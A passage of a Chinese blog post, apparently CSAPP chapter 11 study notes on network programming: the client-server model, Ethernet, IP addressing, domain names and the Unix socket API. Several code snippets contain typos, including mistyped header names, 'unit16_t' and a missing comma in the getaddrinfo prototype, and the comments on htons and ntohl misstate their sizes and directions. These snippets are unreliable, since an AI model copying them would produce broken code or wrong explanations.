    <content type="html"><![CDATA[<p>主要就是客户端和服务器</p><span id="more"></span><h1 id="客户端-服务器编程模型"><a href="#客户端-服务器编程模型" class="headerlink" title="客户端-服务器编程模型"></a>客户端-服务器编程模型</h1><p>每个网络应用都是基于客户端-服务器模型的。采用这个模型，一个应用是由一个服务器进程和一个或者多个客户端组成的。其中，服务器管理了各种资源，并且通过操作这种资源为他们的客户端提供某种服务。</p><p><strong>客户端-服务器模型中的基本操作是事务（transaction）</strong>。一个客户端-服务器事务由一下四步组成：</p><ul><li>当一个客户端需要服务时，他会向服务器发送一个请求，发起一个事务。</li><li>服务器收到请求后，解释它，并以适当的方式操作它的资源</li><li>服务器给客户端发送一个响应，并等待下一个请求。</li><li>客户端收到响应并处理它</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%8B%E5%8A%A1%E6%B5%81%E7%A8%8B.png"></p><p>需要注意的是，<strong>客户端和服务器是进程</strong>，而不是一个主机或者机器。</p><p>一台主机可以同时运行多个服务器和客户端，一个客户端或服务器的事务也可以在同一台主机或者不同的主机上。</p><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>客户端和服务器通常运行在不同的主机上，通过计算机网络来通信。</p><p>对于主机而言，网络只是一种 I&#x2F;O 设备，是数据源和数据接收方，如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84.png"></p><h3 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h3><p>物理上而言，网络是一个按照地理远近组成的层次系统。最低层是 LAN（Local Area Network，局域网），大概是在一个建筑或者校园范围内。迄今为止，最流行的局域网技术是<strong>以太网（Ethernet）</strong>，以太网的适应能力极强.</p><p>一个以太网段（Ethernet segment）包括一些电缆（通常是双绞线）和一个叫做集线器的小盒子，主机用电缆连接到集线器上。</p><ul><li>每根电缆都有相同的最大位带宽，通常是 100Mb&#x2F;s 或者 1Gb&#x2F;s。一端连接到主机的适配器，而另一端则连接到集线器的一个端口上。</li><li>集线器不加分辨地将从一个端口上收到的每个位复制到其他所有的端口上，因此在对一个集线器发送数据会让与之相连的所有主机看到发送的内容。</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%AE%B5.png"></p><p>每个以太网适配器都有一个全球唯一的 48 位地址，它存储在这个适配器的非易失性存储器上。</p><p>一台主机可以发送一个标识了目的 MAC 地址的帧到网段内的任何主机以及其它一些元数据，每个主机都能看到同网段发送的任何消息，但是一般只有 MAC 地址一致的主机会读取这个帧。</p><p>使用电缆和网桥可以把多个互联网段连接成较大的局域网，称之为桥接以太网（bridged Ethernet），不同的电缆的宽带可以是不同的。如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E6%A1%A5%E6%8E%A5%E4%BB%A5%E5%A4%AA%E7%BD%91.png"></p><h3 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h3><p>在层次的更高级别中，多个不兼容的局域网可以通过叫做路由器的特殊计算机连接起来，组成一个 internet（互联网络）。每台路由器对于它所连接到的每个网络都有一个适配器（端口）。</p><p>路由器也能连接高速点到点电话连接，称为 WAN（Wide-Area Network，广域网）。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%B9%BF%E5%9F%9F%E7%BD%91.png"></p><p>互联网络至关重要的特性是，<strong>它能由采用完全不同和不兼容技术的各种局域网和广域网组成</strong>。</p><p>每台主机和其他每台主机都是物理相连的，但是如何能够让某台源主机跨过所有这些不兼容的网络发送数据位到另一台目的主机呢？</p><p>解决的方法就是一层运行在每台主机和路由器上的<strong>协议软件</strong>，它消除了不同网络之间的差异。协议软件实现一种协议，协议来控制主机和路由器之间如何协同工作来实现数据传输。协议有两个基本能力：</p><ul><li><strong>命名机制</strong>：互联网协议通过定义一种一致的主机地址格式，从而消除了不同或联网技术造成的主机地址的分配差异。每台主机会被分配一个唯一得互联网地址，这个地址唯一标识了这台主机。</li><li><strong>传送机制</strong>：互联网络协议通过定义一种把数据位捆扎成不连续的片（称为”包“）的统一方式，在用户之间传输信息。一个包是由包头和有效载荷组成的，其中包头包括包的大小以及源主机和日的主机的地址，有效载荷包括从源主机发出的数据位。</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%92%E8%81%94%E7%BD%91%E4%B9%8B%E9%97%B4%E4%BC%A0%E9%80%81%E6%95%B0%E6%8D%AE.png"></p><p>上图展示了如何在两个不兼容的局域网之间传送数据，经历了以下步骤：</p><ol><li>运行在主机 A 上的客户端进行一个系统调用，从客户端的虚拟地址空间复制数据到内核缓冲区中。</li><li>主机上的协议软件通过在数据前附加互联网络包头和 LAN1 头，创建了个 LAN1 的帧。LAN1 头寻址到路由器，然后它传送这个帧到适配器。</li><li>LAN1 适配器复制该帧到网络上，交给路由器。</li><li>当此帧到达路由器时，路由器的 LAN1 适配器从电缆上读取它，并把它传送到协议软件。</li><li>路由器从互联网络包头中提取出目的互联网络地址，并用它作为路由表的索引，确定向哪里转发这个包。路由器剥落旧的 LAN1 的头，加上寻址到主机 B 的新的 LAN2 头，并把得到的帧传送到适配器。</li><li>路由器把该帧传送到 LAN2 网络上。</li><li>该帧到达主机 B 时，读取这个帧，传送到协议软件。</li><li>主机 B 剥落包头和帧头，读取得到数据。最终，协议软件将会将对应的数据拷贝到对应服务器的虚拟地址空间。</li></ol><h1 id="全球-IP-因特网"><a href="#全球-IP-因特网" class="headerlink" title="全球 IP 因特网"></a>全球 IP 因特网</h1><p>全球 IP 因特网是最著名和最成功的互联网络实现，如下图展示了一个因特网客户端-服务器应用程序的基本硬件和软件组织：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%92%8C%E8%BD%AF%E4%BB%B6.png"></p><p>每台因特网主机都运行实现 TCP&#x2F;IP 协议，几乎每个现代计算机系统都支持这个协议。因特网的客户端和服务器混合使用<strong>套接字接口</strong>函数和 Unix l&#x2F;O 函数来进行通信。</p><p>TCP&#x2F;IP 实际是一个协议族，其中每一个都提供不同的功能。</p><ul><li>IP 机制从某种意义上而言是不可靠的，因为，如果数据报在网络中丢失或者重复，它并不会试图恢复。</li><li>UDP（Unreliable Datagram Protocol，不可靠数据报协议）稍微扩展了 IP 协议，这样一来，包可以在进程间而不是在主机间传送。</li><li>TCP 是一个构建在 IP 之上的复杂协议，提供了进程间可靠的全双工(双向的)连接。</li></ul><p>为了简化讨论，我们将 TCP&#x2F;IP 看做是一个单独的整体协议。</p><p>从程序员的角度，我们可以把因特网看做一个世界范围的主机集合，满足以下特性：</p><ul><li>主机集合被映射为一组 32 位的 <strong>IP 地址</strong>。</li><li>这组 IP 地址被映射为一组称为<strong>因特网域名</strong>（Internet domain name）的标识符。</li><li>因特网主机上的进程能够通过<strong>连接</strong>（connection）和任何其他因特网主机上的进程通信。</li></ul><h3 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h3><p>IP 地址就是一个 32 位的无符号整数。IP 地址数据类型由一个结构体实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* IP address structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> s_addr; <span class="hljs-comment">/* Address in network byte order (big-endian) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其实这个地址它并不应该被放在结构体里，为 IP 地址定义为一个标量类型应该更有意义，但是现在更改的话会有大量的网络应用受到波及。</p><p>因为因特网主机可以有不同的主机字节顺序，TCP&#x2F;IP 为任意整数数据项定义了统一的<strong>网络字节顺序</strong>（network byte order）（大端字节顺序）。例如 IP 地址总是以大端序存放的。但是我们的计算机字节顺序是小端序，Unix 为我们提供了一些函数进行转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">htonl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> hostlong)</span>;   <span class="hljs-comment">//将 32 位整数由主机字节顺序转换为网络字节顺序</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">htons</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> hostshort)</span>;  <span class="hljs-comment">//将 32 位整数从网络字节顺序转换为主机字节</span><br><span class="hljs-comment">// 返回：按照网络字节顺序的值。</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">ntohl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> netlong)</span>;   <span class="hljs-comment">//将 16 位整数由主机字节顺序转换为网络字节顺序</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">ntohs</span><span class="hljs-params">(<span class="hljs-type">unit16_t</span> netshort)</span>;  <span class="hljs-comment">//将 16 位整数从网络字节顺序转换为主机字节</span><br><span class="hljs-comment">// 返回：按照主机字节顺序的值。</span><br></code></pre></td></tr></table></figure><p>IP 地址通常是以一种称为<strong>点分十进制表示法</strong>来表示的。每个字节由它的十进制值表示，并且用句点和其他字节间分开。例如，<code>128.2.194.242</code> 就是地址 <code>0x8002c2f2</code> 的点分十进制表示。</p><p>在 Linux 系统上，我们可以使用 <code>HOSTNAME</code> 命令来确定自已主机的点分十进制地址。</p><p>应用程序使用 <code>inet pton</code> 和 <code>inet ntop</code> 丽数来实现 IP 地址和点分十进制之间的转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet,h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_pton</span><span class="hljs-params">(AF_INET, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">void</span> *dst)</span>;<br><span class="hljs-comment">//返回:若成功则为1，若 src 为非法点分十进制地址则为 0，若出错则为一1。</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntop</span><span class="hljs-params">(AF_INET，<span class="hljs-type">const</span> <span class="hljs-type">void</span> *src,<span class="hljs-type">char</span> *dst,socklen t size)</span>;<br><span class="hljs-comment">//返回:若成功则指向点分十进制字符事的指针，若出错则为 NULL。</span><br></code></pre></td></tr></table></figure><p><code>inet_pton</code> 函数将一个点分十进制串（<em>src</em>）转换为一个二进制的网络字节顺序的IP地址（<em>dst</em>）。如果 <em>src</em> 没有指向一个合法的点分十进制字符串，那么该函数就返回 0。任何其他错误会返回 -1，并设置 errno。相似地，<code>inet_ntop</code> 函数将一个二进制的网络字节顺序的 IP 地址(<em>src</em>)转换为它所对应的点分十进制表示，并把得到的以 null 结尾的字符串的最多 size 个字节复制到 <em>dst</em>。</p><h3 id="因特网域名"><a href="#因特网域名" class="headerlink" title="因特网域名"></a>因特网域名</h3><p>因特网客户端和服务器互相通信时使用的是 IP 地址。然而，对于人们而言，大整数是很难记住的，所以因特网也定义了一组更加人性化的<strong>域名</strong>（domain name），以及一种将域名映射到 IP 地址的机制。</p><p>域名是一串用句点分隔的单词（字母、数字和 -），例如 <strong>whaleshark.ics.cs.emu.edu</strong>。</p><p>域名集合形成了一个层次结构，每个域名编码了它在这个层次中的位置。下图展示了域名层次结构的一部分：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%9F%9F%E5%90%8D%E7%BB%93%E6%9E%84.png"></p><p>层次结构可以表示为一棵树。树的节点表示域名，<strong>反向到根的路径形成了域名</strong>。子树称为子域（subdomain）。层次结构中的第一层是一个未命名的根节点。下一层是一组一级域名（first-level domainname），由非营利组织ICANN（Internet Corporation for Assigned Names and Numbers，因特网分配名字数字协会）定义。</p><p>常见的第一层域名包括 <code>com</code>、<code>edu</code>、<code>gov</code>、<code>org</code> 和 <code>net</code>。</p><p>下一层是二级（second-level）域名，例如 <strong>cmu. edu</strong>，这些域名是由 ICANN 的各个授权代理按照先到先服务的基础分配的。一旦一个组织得到了一个二级域名，那么它就可以在这个子域中创建任何新的域名了。</p><p>例如 ：我拥有了一个二级域名是 <strong>modifier.com</strong> ，这个域名解析到我的一个服务器，那么它的所有子域就归这个服务器管了，比如我可以创建一个 <strong>beautiful.modifier.com</strong></p><p>每台因特网主机都有本地定义的域名 localhost，这个域名总是映射为<strong>回送地址（loopback address）127.0.0.1</strong>：</p><p>通常情况下，域名和 IP 地址之间是一一映射的，但是某些情况下<strong>域名可以多个 IP 地址，一个 IP 地址也可以有多个域名。</strong></p><h3 id="因特网连接"><a href="#因特网连接" class="headerlink" title="因特网连接"></a>因特网连接</h3><p>因特网客户端和服务器通过在连接上发送和接收字节流来通信，他们是点对点，全双工，可靠的通信。</p><p>一个套接字是连接的一个端点。每个套接字都有相应的套接字地址，是由一个因特网地址和一个16 位的整数端口组成的，用<strong>“ 地址：端口 ”</strong>来表示。</p><p>当客户端发起一个连接请求时，客户端套接字地址中的端口是由内核自动分配的，称为<strong>临时端口</strong>（ephemeral port）。而服务器套接字地址中的端口通常是某个<strong>知名端口</strong>，是和这个服务相对应的。例如，Web 服务器通常使用端口 80，它对应的服务的知名名字是 http。</p><p>机器提供的知名名字和知名端口之间的映射存储在文件 <code>/etc/services</code> 中</p><p>一个连接是由它两端的套接字地址唯一确定的。这对套接字地址叫做<strong>套接字对</strong>，由下列元组来表示： <code>(cliaddr;cliport，servaddr:servport)</code>。</p><p>其中 <em>cliaddr</em> 是客户端的 IP 地址，<em>cliport</em> 是客户端的端口；<em>servaddr</em> 是服务器的 IP 地址，而 <em>servport</em> 是服务器的端口。</p><p>如下图是一个Web客户端和服务器之间的连接：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%A5%97%E6%8E%A5%E5%AD%97%E5%AF%B9.png"></p><p>在这个示例中，Web 客户端的套接字地址是：</p><p><strong>128.2.194.242:51213</strong></p><p>其中端口号 51213 是内核分配的临时端口号。Web 服务器的套接字地址是：</p><p><strong>208.216.181.15:80</strong></p><p>其中端口号 80 是和 Web 服务相关联的知名端口号。给定这些客户端和服务器套接字地址，客户端和服务器之间的连接就由下列套接字对唯一确定了：</p><p><strong>(128.2.194.242:51213, 208.216.181.15:80)</strong></p><h1 id="套接字接口"><a href="#套接字接口" class="headerlink" title="套接字接口"></a>套接字接口</h1><p>套接字接口（socket interface）是一组函数，它们和 Unix I&#x2F;0 函数结合起来，用以创建网络应用。大多数现代系统上都实现套接字接口，包括所有的 Unix 变种、Windows 和 Macintosh 系统。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%A5%97%E6%8E%A5%E5%AD%97%E7%9A%84%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8.png"></p><h3 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h3><p>从 Linux 内核的角度来看，一个套接字就是通信的一个端点。从 Linux 程序的角度来看，套接字就是一个有相应描述符的打开文件。</p><p>因特网的套接字地址存放在类型为 sockaddr_in    的 16 字节结构中。对于因特网应用，sin_family 成员是 AF_INET，sin_port 成员是一个 16 位的端口号，而 sin_addr 成员就是一个 32 位的 IP 地址。IP 地址和端口号总是以网络字节顺序（大端法）存放的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* IP socket address structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>       sin_family;   <span class="hljs-comment">/* 协议族 Protocol family (always AF_INET) */</span><br>    <span class="hljs-type">uint16_t</span>       sin_port;     <span class="hljs-comment">/* 端口号 Port number in network byte order */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span>     <span class="hljs-comment">/* 大端法ip地址 IP address in network byte order */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>  sin_zero[<span class="hljs-number">8</span>];  <span class="hljs-comment">/* 填充字节 Pad to sizeof(struct sockaddr) */</span><br>&#125;;<br><br><span class="hljs-comment">/* Generic socket address structure (for connect, bind, and accept) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>  sa_family;    <span class="hljs-comment">/* 协议族 Protocol family */</span><br>    <span class="hljs-type">char</span>      sa_data[<span class="hljs-number">14</span>];  <span class="hljs-comment">/* Address data */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里的 _in 后缀是 inernet 的意思</p></blockquote><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>客户端和服务器使用 <code>socket</code> 函数来<strong>创建一个套接字描述符</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain,<span class="hljs-type">int</span> type,<span class="hljs-type">int</span> protocol)</span>;<br><span class="hljs-comment">//返回:若成功则为非负描述符，若出错则为-1。</span><br></code></pre></td></tr></table></figure><p>如果想要使套接字成为连接的一个端点，就用如下硬编码的参数来调用 socket 函数 <code>clientfd = Socket(AF_INET，SOCK_STREAM，0);</code> 其中，<em>AF_INET</em> 表明我们正在使用 32 位 IP 地址，而 <em>SOCK_STREAM</em> 表示这个套接字是连接的一个端点。</p><p><code>socket</code> 返回的 <code>clientfd</code> 描述符仅是<strong>部分打开的，还不能用于读写</strong>。如何完成打开套接字的工作，取决于我们是客户端还是服务器。</p><h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><p>客户端通过调用 connect 函数来<strong>建立和服务器的连接</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> clientfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><span class="hljs-comment">//返回:若成功则为 0，若出错则为-1。</span><br></code></pre></td></tr></table></figure><p><code>connect</code> 函数试图与套接字地址为 <em>addr</em> 的服务器建立一个因特网连接，其中 <em>addrlen</em> 是 <code>sizeof(sockaddr_in)</code>。</p><p>connect 函数会阻塞，一直到连接成功建立或是发生错误。如果成功，<code>clientfd</code> 描述符现在就准备好可以读写了，并且得到的连接是由套接字对 <code>(x:y,addr.sin_addr:addr.sin_port)</code>刻画的，其中 <em>x</em> 表示客户端的 IP 地址，而 <em>y</em> 表示临时端口，它唯一地确定了客户端主机上的客户端进程。</p><h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p><code>bind</code>、<code>listen</code> 和 <code>accept</code>，服务器用它们来<strong>和客户端建立连接</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,</span><br><span class="hljs-params">         <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><br><span class="hljs-comment">// 返回：若成功则为 0，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><p><code>bind</code> 函数告诉内核将 <em>addr</em> 中的服务器套接字地址和套接字描述符 <code>sockfd</code> 联系起来。参数 <em>addrlen</em> 也是 <code>sizeof(sockaddr in)</code> 。</p><p>就比如我们在这个函数中指定 addr 是 <code>127.0.0.1：8080</code> ，那么通过这个 ip 地址和端口（在这里就是本地访问）就可以找到并访问服务端啦。</p><h3 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h3><p>首先我们先了解主动实体和被动实体：</p><ul><li>客户端是发起连接请求的主动实体</li><li>服务器是等待来自客户端的连接请求的被动实体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span>;<br><span class="hljs-comment">// 返回：若成功则为 0，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><p>默认情况下，内核会认为 <code>socket</code> 函数创建的描述符对应于主动套接字，存在于一个连接的客户端。</p><p>服务器调用 <code>listen</code> 函数将 <code>sockfd</code> 从一个主动套接字转化为一个监听套接字，告诉内核这个描述符是被服务器使用的，该套接字可以接受来自客户端的连接请求。</p><h3 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h3><p>服务器通过调用 <code>accept</code> 函数来等待来自客户端的连接请求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> listenfd,<span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">int</span> *addrlen)</span>;<br><span class="hljs-comment">//返回：若成功则为非负连接描述符，若出错则为-1。</span><br></code></pre></td></tr></table></figure><p><code>accept</code> 函数等待来自客户端的连接请求到达侦听描述符 <code>listenfd</code>，然后在 <em>addr</em> 中填写客户端的套接字地址，并返回一个已连接描述符，这个描述符可被用来利用 UnixI&#x2F;O 函数与客户端通信。</p><p>监听描述符和已连接描述符：</p><ul><li>监听描述符：作为客户端连接请求的一个端点，被创建一次，服务于整个 socket 周期</li><li>已连接描述符：每次请求连接时创建，只服务当前客户端</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E7%9B%91%E5%90%AC%E5%92%8C%E5%B7%B2%E8%BF%9E%E6%8E%A5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png"></p><h3 id="主机和服务的转换"><a href="#主机和服务的转换" class="headerlink" title="主机和服务的转换"></a>主机和服务的转换</h3><p>Linux 提供了 <code>getaddrinfo</code> 和 <code>getnameinfo</code> 函数实现二进制套接字地址结构和主机名、主机地址、服务名和端口号的字符串表示之间的相互转化。</p><h4 id="getaddrinfo"><a href="#getaddrinfo" class="headerlink" title="getaddrinfo"></a>getaddrinfo</h4><p>getaddrinfo 函数将主机名、主机地址、服务名和端口号的字符串表示转化成套接字地址结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getaddrinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *host, </span><br><span class="hljs-params">                <span class="hljs-type">const</span> <span class="hljs-type">char</span>*service,</span><br><span class="hljs-params">                <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> addrinfo *hintsstruct addrinfo **result)</span>;<br><span class="hljs-comment">//返回;如果成功则为0，如果错误则为非零的错误代码</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">freeaddrinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *result)</span>;<br><span class="hljs-comment">//返回:无</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">gai_strerror</span><span class="hljs-params">(<span class="hljs-type">int</span> errcode)</span>;<br><span class="hljs-comment">//返回;错误消息</span><br></code></pre></td></tr></table></figure><p>数据结构如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-getaddrinfo.png"></p><p>参数：</p><ul><li>host：域名，或者是ip地址</li><li>service：服务名</li><li>hints：可选参数，传递一些标志位参数</li><li>result：接收返回结果</li></ul><p>如果要传递 hints 参数，只能设置下列字段：ai_family、ai_socktype、ai_protocol 和 ai_flags 字段。其他字段必须设置为 0（或 NULL）。</p><p>我们用 memset 将整个结构而清零，然后有选择地设置一些字段：</p><ul><li><strong>ai_flags 字段</strong>：我们可以把各种值组合起来得到该掩码<ul><li><strong>AI_CANONNAME</strong>：ai_canonname 字段默认为 NULL。如果设置了该标志，就是告诉 getaddrinfo 将列表中第一个 addrinfo 结构的 ai_canonname 字段指向 host 的权威名字。</li><li><strong>AI_NUMERICSERV</strong>：参数 service 默认可以是服务名或端口号。这个标志强制参数 service 为端口号。</li><li><strong>AI_PASSIVE</strong>：getaddrinfo 默认返回套接字地址，客户端可以在调用 connect 时用作主动套接字。这个标志告诉该函数，返回的套接字地址可能被服务器用作监听套接字。在这种情况中，参数 host 应该为 NULL。得到的套接字地址结构中的地址字段会是通配符地址（wildcard address），告诉内核这个服务器会接受发送到该主机所有 IP 地址的请求。这是所有示例服务器所默认的行为。</li></ul></li><li><strong>ai_family</strong>：指定返回地址的协议簇，取值范围：AF_INET(IPv4)、AF_INET6(IPv6)、AF_UNSPEC(IPv4 and IPv6)</li><li><strong>ai_socktype</strong>：用于设定返回地址的 socket 类型，常用的有 SOCK_STREAM、SOCK_DGRAM、SOCK_RAW, 设置为 0 表示所有类型都可以。</li><li><strong>ai_protocol</strong>：有 IPPROTO_TCP、IPPROTO_UDP 等，设置为 0 表示所有协议。</li></ul><h4 id="getnameinfo"><a href="#getnameinfo" class="headerlink" title="getnameinfo"></a>getnameinfo</h4><p>getnameinfo 函数和 getaddrinfo 是相反的，将一个套接字地址结构转换成相应的主机和服务名字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 